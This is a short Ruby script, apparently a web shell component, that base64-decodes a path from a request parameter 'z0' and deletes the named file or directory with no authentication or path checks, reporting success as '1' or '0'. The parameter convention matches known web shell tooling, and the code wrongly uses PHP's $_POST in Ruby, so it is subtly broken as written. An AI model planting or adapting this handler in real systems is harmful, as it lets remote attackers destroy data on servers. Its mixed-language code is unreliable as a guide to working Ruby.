require 'base64'

def main
  sz_entry = Base64.decode64($_POST['z0'].to_s)

  begin
    if Dir.exist?(sz_entry)
      Dir.rmdir(sz_entry)
    else
      File.unlink(sz_entry)
    end
    
    print "1"
  rescue => e
    print "0"
  end
end

main